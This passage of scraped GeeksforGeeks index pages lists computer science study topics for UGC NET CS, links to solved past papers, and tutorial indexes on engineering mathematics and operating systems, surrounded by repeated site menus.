Clipping | Set 1 (Cohen–Sutherland Algorithm) Polygon Clipping | Sutherland–Hodgman Algorithm Snowflakes Fractal Koch Curve or Koch Snowflake Klee’s Algorithm (Length Of Union Of Segments of a line) Cubic Bezier Curve Fractals in C/C++ DDA Line generation Algorithm in Computer Graphics Bresenham’s Line Generation Algorithm Bresenham’s circle drawing algorithm Neighbors of a point on a circle using Bresenham’s algorithm Bresenham’s Algorithm for 3-D Line Drawing Mid-Point Line Generation Algorithm Program to find line passing through 2 Points Anti-aliased Line | Xiaolin Wu’s algorithm Mid-Point Circle Drawing Algorithm Boundary Fill Algorithm Draw a circle without floating point arithmetic Chain Code for 2D Line Storage Devices and Tools : Computer Graphics : Computer Graphics : Section 10: Artificial Intelligence Definitions, AI approach for solving problems. Automated Reasoning with prepositional logic and predicate logic-fundamental proof procedure, refutation, resolution, refinements to resolution (ordering / pruning / restriction strategies). State space representation of problems, bounding functions, breadth first, depth first, A, A*, AO*, etc. Performance comparison of various search techniques. Frames, scripts, semantic nets, production systems, procedural representations. Prolog programming. Components of an expert system, Knowledge representation and Acquisition techniques, Building expert system and Shell. RTNs, ATNs, Parsing of Ambiguous CFGs. Tree Adjoining Grammars (TAGs). Systems approach to planning, Designing, Development, Implementation and Evaluation of MIS. Decision-making processes, evaluation of DSS, Group decision support system and case studies, Adaptive design approach to DSS development, Cognitive style in DSS, Integrating expert and Decision support systems. Artificial Intelligence : Getting started with Machine Learning Artificial Intelligence | An Introduction Machine Learning An introduction to Machine Learning | Set 2 Introduction to Data in Machine Learning Introduction to Deep Learning Demystifying Machine Learning Machine Learning – Applications Machine Learning and Artificial Intelligence Difference between Machine learning and Artificial Intelligence Agents in Artificial Intelligence Types of Learning – Supervised Learning Types of Learning – Part 2 Supervised and Unsupervised learning Reinforcement learning Regression and Classification | Supervised Machine Learning Logistic Regression Multivariate Regression Confusion Matrix in Machine Learning A single neuron neural network Clustering in Machine Learning Different Types of Clustering Algorithm K means Clustering – Introduction Analysis of test data using K-Means Clustering Introduction to Artificial Neutral Networks | Set 1 Introduction to Artificial Neural Network | Set 2 Introduction to ANN (Artificial Neural Networks) | Set 3 (Hybrid Systems) Fuzzy Logic | Introduction Fuzzy Logic | Set 2 (Classical and Fuzzy Sets) Machine Learning Fuzzy Logic and Misc Artificial Intelligence : Artificial Intelligence : Last Updated on : 26th July, 2018 Other Useful Links : UGC NET CS Notes according to syllabus of Paper-II Previous years UGC NET CS solved papers Articles on Computer Science GATE CS Notes according to GATE 2019 syllabus Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above! My Personal Notes arrow_drop_up Save Load Comments room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Previous years UGC NET CS solved papers - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Previous years UGC NET CS solved papers The page contains solutions of previous year UGC NET CS papers with explanations, topic wise Quizzes, notes/tutorials and important links for preparation. UGC NET CS 2018 Dec – II UGC NET CS 2018 July – II UGC-NET CS 2017 Nov – II UGC-NET CS 2017 Nov – III UGC NET CS 2017 Jan – II UGC NET CS 2017 Jan – III UGC NET CS 2016 Aug – II UGC NET CS 2016 Aug – III UGC NET CS 2016 July – II UGC NET CS 2016 July – III UGC NET CS 2015 Dec – II UGC NET CS 2015 Dec – III UGC NET CS 2015 Jun – II UGC NET CS 2015 Jun – III Other Useful Links : Articles on Computer Science UGC NET CS Notes according to syllabus of Paper-II Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above! My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Engineering Mathematics Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Propositional and First-Order Logicexpand_moreEngineering Mathematics TutorialsMathematics | Introduction to Propositional Logic | Set 1Mathematics | Introduction to Propositional Logic | Set 2Mathematics | Propositional EquivalencesMathematics | Predicates and Quantifiers | Set 1Mathematics | Predicates and Quantifiers | Set 2Mathematics | Some theorems on Nested QuantifiersMathematics | Rules of InferencePDNF and PCNF in Discrete MathematicsSet Theoryexpand_moreMathematics | Introduction of Set theoryMathematics | Set Operations (Set theory)Inclusion-Exclusion and its various ApplicationsMathematics | Power Set and its PropertiesMathematics | Partial Orders and LatticesMathematics | Algebraic StructureMathematics | Introduction and types of RelationsDiscrete Mathematics | Representing RelationsMathematics | Representations of Matrices and Graphs in RelationsMathematics | Closure of Relations and Equivalence RelationsNumber of possible Equivalence Relations on a finite setMathematics | Classes (Injective, surjective, Bijective) of FunctionsMathematics | Total number of possible functionsDiscrete Maths | Generating Functions-Introduction and PrerequisitesMathematics | Generating Functions – Set 2Mathematics | Sequence, Series and SummationsMathematics | Independent Sets, Covering and MatchingMathematics | Introduction to ProofsDiscrete Mathematics | Hasse DiagramsIntroduction to Mojette transformMathematics | Rings, Integral domains and FieldsCombinatoricsexpand_moreMathematics | The Pigeonhole PrincipleMathematics | Combinatorics BasicsMathematics | PnC and Binomial CoefficientsMathematics | Generalized PnC Set 1Mathematics | Generalized PnC Set 2Corollaries of Binomial TheoremNumber of triangles in a plane if no more than two points are collinearMathematics | Sum of squares of even and odd natural numbersFinding nth term of any Polynomial SequenceDiscrete Mathematics | Types of Recurrence Relations – Set 2Graph Theoryexpand_moreMathematics | Graph Theory Basics – Set 1Mathematics | Graph Theory Basics – Set 2Graph Types and ApplicationsMathematics | Euler and Hamiltonian PathsMathematics | Planar Graphs and Graph ColoringMathematics | Graph Isomorphisms and ConnectivityMathematics | Matching (graph theory)Betweenness Centrality (Centrality Measure)Mathematics | Walks, Trails, Paths, Cycles and Circuits in GraphGraph measurements: length, distance, diameter, eccentricity, radius, centerRelationship between number of nodes and height of binary treeLinear Algebraexpand_moreMathematics | Matrix IntroductionDifferent Operations on MatricesMathematics | L U Decomposition of a System of Linear EquationsDoolittle Algorithm : LU DecompositionMathematics | System of Linear EquationsMathematics | Eigen Values and Eigen VectorsProbabilityexpand_moreMathematics | ProbabilityMathematics | Random VariablesMathematics | Mean, Variance and Standard DeviationMathematics | Law of total probabilityBayes’s Theorem for Conditional ProbabilityMathematics | Probability Distributions Set 1 (Uniform Distribution)Mathematics | Probability Distributions Set 2 (Exponential Distribution)Mathematics | Probability Distributions Set 3 (Normal Distribution)Mathematics | Probability Distributions Set 4 (Binomial Distribution)Mathematics | Probability Distributions Set 5 (Poisson Distribution)Mathematics | Hypergeometric Distribution modelMathematics | Conditional ProbabilityMathematics | Covariance and CorrelationCalculusexpand_moreMathematics | Limits, Continuity and DifferentiabilityMathematics | Lagrange’s Mean Value TheoremMathematics | Rolle’s Mean Value TheoremCauchy’s Mean Value TheoremMathematics | Indefinite IntegralsMath Practice Questionsexpand_moreMathematics | Problems On Permutations | Set 1Problem on permutations and combinations | Set 2Mathematics | Graph theory practice questionsMath GATE Questionsexpand_morePermutation and CombinationPropositional and First Order Logic.Set Theory & AlgebraCombinatoricsGraph TheoryLinear AlgebraProbabilityNumerical Methods and Calculus Engineering Mathematics Tutorials Recent Articles on Engineering Mathematics Discrete Mathematics : Propositional and First Order Logic Set Theory Combinatorics Probability Graph Theory Engineering Mathematics : Linear Algebra Calculus Statistics and Numerical Methods Quick Links Discrete Mathematics Propositional and First Order Logic : Introduction to Propositional Logic Introduction to Propositional Logic | Set 2 Propositional Equivalences Predicates and Quantifiers Predicates and Quantifiers | Set 2 Some theorems on Nested Quantifiers Rules of Inference PDNF and PCNF in Discrete Mathematics Set Theory : Introduction Set Operations Inclusion-Exclusion and its various Applications Power Set and its Properties Partial Orders and Lattices Groups Introduction and types of Relations Discrete Mathematics | Representing Relations Relations | Representations in Matrices and Graphs Closure of Relations and Equivalence Relations Number of possible Equivalence Relations on a finite set Classes (Injective, surjective, Bijective) of Functions Total number of possible functions Generating Functions | Introduction and Prerequisites Generating Functions – Set 2 Sequence, Series and Summations Independent Sets, Covering and Matching Introduction to Proofs Hasse Diagrams Introduction to Mojette transform Rings, Integral domains and Fields >> Quiz on Set Theory and Algebra Combinatorics : Pigeon Hole Principle Combinatorics Basics PnC and Binomial Coefficients Generalized PnC Set 1 Generalized PnC Set 2 Corollaries of Binomial Theorem Number of triangles in a plane if no more than two points are collinear Sum of squares of even and odd natural numbers Finding nth term of any Polynomial Sequence Discrete Mathematics | Types of Recurrence Relations – Set 2 >> Combination and Permutation Practice Questions | Set 1 >> Problem on permutations and combinations | Set 2 Probability : Mathematics | Probability Conditional Probability Bayes’s Formula for Conditional probability Prosecutor’s Fallacy Random Variables Graph Theory : Graph Theory Basics – Set 1 Graph Theory Basics – Set 2 Graph Types and Applications Euler and Hamiltonian Paths Planar Graphs and Graph Coloring Graph Isomorphisms and Connectivity Matching (graph theory) Betweenness Centrality (Centrality Measure) Mathematics | Walks, Trails, Paths, Cycles and Circuits in Graph Graph measurements: length, distance, diameter, eccentricity, radius, center Relationship between number of nodes and height of binary tree >> Graph theory practice questions Engineering Mathematics Linear Algebra : Matrix Introduction Different Operations on Matrices Representations of Matrices and Graphs in Relations Eigen Values and Eigen Vectors System of Linear Equations LU Decomposition of a System of Linear Equations Doolittle Algorithm : LU Decomposition >> Quiz on Linear Algebra Calculus : Limits, Continuity and Differentiability Cauchy’s Mean Value Theorem Lagrange’s Mean Value Theorem Rolle’s Mean Value Theorem Unimodal functions and Bimodal functions Surface Area and Volume of Hexagonal Prism Inverse functions and composition of functions Indefinite Integrals Statistics and Numerical Methods : Mean, Variance and Standard Deviation Newton’s Divided Difference Interpolation Formula Law of total probability Probability Distributions Set 1 (Uniform Distribution) Probability Distributions Set 2 (Exponential Distribution) Probability Distributions Set 3 (Normal Distribution) Probability Distributions Set 4 (Binomial Distribution) Probability Distributions Set 5 (Poisson Distribution) Homogeneous Poisson Process Nonhomogeneous Poisson Processes Renewal processes in probability Mathematics | Covariance and Correlation Scales of Measurement Univariate, Bivariate and Multivariate data and its analysis Hypergeometric Distribution model Quick Links : ‘Quizzes’ on Engineering Mathematics ! My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseDesign Twitter - A System Design Interview QuestionTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceCheck whether count of odd and even factors of a number are equal room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Operating Systems - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreOperating SystemsIntroduction of Operating System – Set 1Types of Operating SystemsFunctions of Operating SystemNeed and Functions of Operating SystemsProcess & Threadsexpand_moreIntroduction of Process ManagementStates of a Process in Operating SystemsProcess Schedulers in Operating SystemProcess Table and Process Control Block (PCB)InterruptsThread in Operating SystemThreads and its types in Operating SystemDifference between Process and ThreadCPU Schedulingexpand_moreCPU Scheduling in Operating SystemsPreemptive and Non-Preemptive SchedulingProgram for FCFS CPU Scheduling | Set 1Convoy Effect in Operating SystemsBelady’s Anomaly in Page Replacement AlgorithmsProgram for Shortest Job First (or SJF) CPU Scheduling | Set 1 (Non- preemptive)Program for Shortest Job First (SJF) scheduling | Set 2 (Preemptive)Longest Remaining Time First (LRTF) CPU Scheduling AlgorithmProgram for Round Robin scheduling | Set 1Starvation and Aging in Operating SystemsMultilevel Queue (MLQ) CPU SchedulingLottery Process Scheduling in Operating SystemProcess Synchronizationexpand_moreIntroduction of Process SynchronizationCritical Section in SynchronizationInter Process Communication (IPC)Semaphores in Process SynchronizationMutex vs SemaphoreProducer Consumer Problem using Semaphores | Set 1Dining Philosopher Problem Using SemaphoresSleeping Barber problem in Process SynchronizationReaders-Writers Problem | Set 1 (Introduction and Readers Preference Solution)Deadlockexpand_moreIntroduction of Deadlock in Operating SystemDeadlock Detection Algorithm in Operating SystemDeadlock Detection And RecoveryDeadlock Prevention And AvoidanceBanker’s Algorithm in Operating SystemResource Allocation Graph (RAG) in Operating SystemMemory Managementexpand_moreIntroduction to memory and memory unitsMemory Hierarchy Design and its CharacteristicsBuddy System – Memory allocation techniqueFixed (or static) Partitioning in Operating SystemVariable (or dynamic) Partitioning in Operating SystemNon-Contiguous Allocation in Operating SystemLogical and Physical Address in Operating SystemPaging in Operating SystemPage Table Entries in Page TableInverted Page Table in Operating SystemHashed Page Tables in Operating SystemSegmentation in Operating SystemVirtual Memory in Operating SystemPage Replacement Algorithms in Operating SystemsOverlays in Memory ManagementDisk Managementexpand_moreFile Systems in Operating SystemStructures of Directory in Operating SystemFile Allocation MethodsFree space management in Operating SystemDisk Schedulingexpand_moreDisk Scheduling AlgorithmsProgram for SSTF disk scheduling algorithmSCAN (Elevator) Disk Scheduling AlgorithmsC-SCAN Disk Scheduling AlgorithmLOOK Disk Scheduling AlgorithmC-LOOK Disk Scheduling AlgorithmN-Step-SCAN disk schedulingFScan disk scheduling algorithmOperating System Quizesexpand_moreOperating Systems | Set 1Operating Systems | Set 2Operating Systems | Set 3Operating Systems | Set 4Operating Systems | Set 5Operating System GATE Questionsexpand_moreOS Process ManagementOS Memory ManagementOS Input Output SystemsOS CPU SchedulingDeadlock Operating Systems Recent Articles on Operating Systems Basics System Structure CPU Scheduling Process Synchronization Deadlock Processes & Threads Memory Management File and Disk Management Misc Basics : Introduction of Operating System Types of Operating Systems Functions of Operating System Real time systems Tasks in Real Time systems Difference between multitasking, multithreading and multiprocessing Types of computer memory (RAM and ROM) Difference between 32-bit and 64-bit operating systems What happens when we turn on computer? Boot Block UEFI(Unified Extensible Firmware Interface) and how is it different from BIOS System Structure : Microkernel Kernel I/O Subsystem (I/O System) Monolithic Kernel and key differences from Microkernel Introduction of System Call Get/Set process resource limits in C Dual Mode operations in OS Privileged and Non-Privileged Instructions CPU Scheduling : Process | (Introduction and different states) States of a process Process Table and Process Control Block (PCB) Process Scheduler CPU Scheduling Preemptive and Non-Preemptive Scheduling Measure the time spent in context switch? Difference between dispatcher and scheduler FCFS Scheduling | Set 1 FCFS Scheduling | Set 2 Convoy Effect in Operating Systems Belady’s Anomaly Shortest Job First (or SJF) scheduling | Set 1 (Non- preemptive) Program for Shortest Job First (SJF) scheduling | Set 2 (Preemptive) Shortest Job First scheduling with predicted burst time Longest Remaining Time First (LRTF) Program Longest Remaining Time First (LRTF) algorithm Round Robin scheduling Selfish Round Robin Scheduling Round Robin Scheduling with different arrival times Priority Scheduling Program for Preemptive Priority CPU Scheduling Priority Scheduling with different arrival time – Set 2 Starvation and Aging in Operating Systems Highest Response Ratio Next (HRRN) Scheduling Multilevel Queue Scheduling Multilevel Feedback Queue Scheduling Lottery Process Scheduling Multiple-Processor Scheduling >> Quiz on CPU Scheduling Process Synchronization : Process Synchronization | Introduction Process Synchronization | Set 2 Critical Section Inter Process Communication Interprocess Communication: Methods IPC through shared memory IPC using Message Queues Message based Communication in IPC (inter process communication) Communication between two process using signals in C Semaphores in operating system Mutex vs. Semaphore Process Synchronization | Monitors Peterson’s Algorithm for Mutual Exclusion | Set 1 (Basic C implementation) Peterson’s Algorithm for Mutual Exclusion | Set 2 (CPU Cycles and Memory Fence) Peterson’s Algorithm (Using processes and shared memory) Dekker’s algorithm Bakery Algorithm Producer Consumer Problem using Semaphores | Set 1 Dining Philosopher Problem Using Semaphores Dining-Philosophers Solution Using Monitors Readers-Writers Problem | Set 1 (Introduction and Readers Preference Solution) Reader-Writers solution using Monitors Sleeping Barber problem Lock variable synchronization mechanism Mutex lock for Linux Thread Synchronization Priority Inversion : What the heck ! What’s difference between Priority Inversion and Priority Inheritance ? Process Synchronization Interprocess Communication: Methods >> Quiz on Process Management in OS Deadlock : Deadlock Introduction Deadlock Detection And Recovery Deadlock, Starvation, and Livelock Deadlock Prevention And Avoidance Banker’s Algorithm Resource Allocation Graph (RAG) Methods of resource allocation to processes by operating system Program for Banker’s Algorithm Banker’s Algorithm : Print all the safe state (or safe sequences) Deadlock detection algorithm Program for Deadlock free condition in Operating System Deadlock detection in Distributed systems Techniques used in centralized approach of deadlock detection in distributed systems >> Quiz on Deadlock Processes & Threads : Operating System | Thread Threads and its types Operating System | User Level thread Vs Kernel Level thread Process-based and Thread-based Multitasking Multi threading models Benefits of Multithreading Zombie Processes and their Prevention Maximum number of Zombie process a system can handle Operating System | Remote Procedure call (RPC) Memory Management : Memory Hierarchy Design and its Characteristics Introduction to memory and memory units Different Types of RAM (Random Access Memory) Buddy System: Memory allocation technique Memory Management | Partition Allocation Method Fixed (or static) Partitioning in Operating System Variable (or dynamic) Partitioning in Operating System Non-Contiguous Allocation in Operating System Logical vs Physical Address in Operating System Paging Requirements of memory management system Memory management – mapping virtual address to physical addresses Page Table Entries Virtual Memory Memory Interleaving Virtual Memory Questions Operating system based Virtualization Inverted Page Table Swap Space Page Fault Handling Fixed (or static) Partitioning in Operating System Segmentation Memory Segmentation in 8086 Microprocessor Program for Next Fit algorithm in Memory Management Overlays in Memory Management Page Replacement Algorithms Program for Page Replacement Algorithms | Set 1 ( LRU) Program for Optimal Page Replacement Algorithm LFU (Least Frequently Used) Cache Implementation Second Chance (or Clock) Page Replacement Policy Techniques to handle Thrashing Allocating kernel memory (buddy system and slab system) Program for buddy memory allocation scheme in Operating Systems | Set 1 (Allocation) Program for buddy memory allocation scheme in Operating Systems | Set 2 (Deallocation) Static and Dynamic Libraries | Set 1 Working with Shared Libraries | Set 1 Working with Shared Libraries | Set 2 Named Pipe or FIFO with example C program Tracing memory usage in Linux >> Quiz on Memory Management Disk Management File Systems Unix File System Implementing Directory Management using Shell Script File Directory | Path Name Structures of Directory File Allocation Methods File Access Methods Secondary memory Secondary memory – Hard disk drive Disk Scheduling Algorithms Program for SSTF disk scheduling algorithm What exactly Spooling is all about? Difference between Spooling and Buffering Free space management >> Quiz on Input Output Systems Misc Introduction to UNIX System Important Linux Commands (leave, diff, cal, ncal, locate and ln) Process states and Transitions in a UNIX Process Introduction to Linux Shell and Shell Scripting ‘crontab’ in Linux with Examples indepth and maxdepth in Linux find() command for limiting search to a specific directory. Quick Links : Last Minute Notes (LMNs) | Operating Systems Commonly Asked Operating Systems Interview Questions Gate Practice Questions ‘Quizzes’ on Operating Systems ! ‘Practice Problems’ on Operating Systems ! My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Database Management System (DBMS) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE 